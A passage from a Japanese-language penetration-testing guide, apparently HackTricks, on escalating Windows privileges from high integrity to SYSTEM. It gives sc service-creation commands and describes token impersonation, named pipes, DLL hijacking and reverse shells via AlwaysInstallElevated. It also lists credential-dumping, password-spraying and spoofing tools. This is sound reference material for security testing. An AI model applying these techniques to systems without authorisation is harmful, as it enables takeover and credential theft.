[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **高い整合性からシステムへ**

### **新しいサービス**

すでに高い整合性プロセスで実行している場合、**SYSTEMにパスする**のは、**新しいサービスを作成して実行する**だけで簡単です：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

高い整合性プロセスから、**AlwaysInstallElevatedレジストリエントリを有効にし**、_**.msi**_ラッパーを使用して**リバースシェルをインストール**しようとすることができます。\
[関与するレジストリキーと_.msi_パッケージのインストール方法についての詳細はこちら。](./#alwaysinstallelevated)

### High + SeImpersonate特権からSystemへ

**コードは** [**こちらで見つけることができます**](seimpersonate-from-high-to-system.md)**。**

### SeDebug + SeImpersonateからフルトークン特権へ

これらのトークン特権を持っている場合（おそらくすでに高い整合性プロセスで見つけるでしょう）、**ほぼすべてのプロセス**（保護されたプロセスではない）をSeDebug特権で**開くことができ**、プロセスの**トークンをコピー**し、そのトークンを使用して**任意のプロセスを作成**することができます。\
この技術を使用する際は、通常、**すべてのトークン特権を持つSYSTEMとして実行されている任意のプロセスを選択します**（_はい、すべてのトークン特権を持たないSYSTEMプロセスを見つけることができます_）。\
**提案された技術を実行するコードの例は** [**こちらで見つけることができます**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この技術は、meterpreterが`getsystem`で昇格するために使用されます。この技術は、**パイプを作成し、そのパイプに書き込むサービスを作成/悪用する**ことから成ります。次に、**`SeImpersonate`**特権を使用してパイプを作成した**サーバー**は、パイプクライアント（サービス）の**トークンを偽装**し、SYSTEM特権を取得することができます。\
名前付きパイプについて[**もっと学びたい場合はこれを読むべきです**](./#named-pipe-client-impersonation)。\
高い整合性からSYSTEMに名前付きパイプを使用して移行する[**方法の例を読みたい場合はこれを読むべきです**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM**として実行されている**プロセス**によって**ロードされるdllをハイジャック**することができれば、その権限で任意のコードを実行することができます。したがって、Dll Hijackingはこの種の特権昇格にも役立ち、さらに、高い整合性プロセスからは**はるかに簡単に達成できます**。それは、dllをロードするために使用されるフォルダーに**書き込み権限**を持っているからです。\
**Dllハイジャックについてもっと学ぶことができます** [**こちらで**](dll-hijacking/)**。**

### **AdministratorまたはNetwork ServiceからSystemへ**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICEまたはNETWORK SERVICEからフル特権へ

**読む:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## さらなるヘルプ

[静的インパケットバイナリ](https://github.com/ropnop/impacket_static_binaries)

## 有用なツール

**Windowsローカル特権昇格ベクトルを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 誤設定と機密ファイルをチェックします（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出されました。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 一部の可能な誤設定をチェックし、情報を収集します（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 誤設定をチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、およびRDPの保存されたセッション情報を抽出します。ローカルで-Thoroughを使用します。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 資格情報マネージャーから資格情報を抽出します。検出されました。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメインにスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell ADIDNS/LLMNR/mDNS/NBNSスプーフィングおよび中間者ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な特権昇格Windows列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の特権昇格脆弱性を検索します（Watsonのために非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（管理者権限が必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の特権昇格脆弱性を検索します（VisualStudioを使用してコンパイルする必要があります）（[**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 誤設定を探してホストを列挙します（特権昇格よりも情報収集ツール）（コンパイルが必要） **（[**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（GitHubに事前コンパイル済みexe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#への移植**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 誤設定をチェックします（GitHubに事前コンパイル済みの実行可能ファイル）。推奨されません。Win10ではうまく機能しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な誤設定をチェックします（Pythonからのexe）。推奨されません。Win10ではうまく機能しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツール（正しく動作するためにaccesschkは必要ありませんが、使用することができます）。

**ローカル**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するエクスプロイトを推奨します（ローカルPython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するエクスプロイトを推奨します（ローカルPython）

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

正しいバージョンの.NETを使用してプロジェクトをコンパイルする必要があります（[これを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている.NETのバージョンを確認するには、次のようにします：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliography

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{% hint style="success" %}
AWSハッキングを学び、練習する:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください!
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
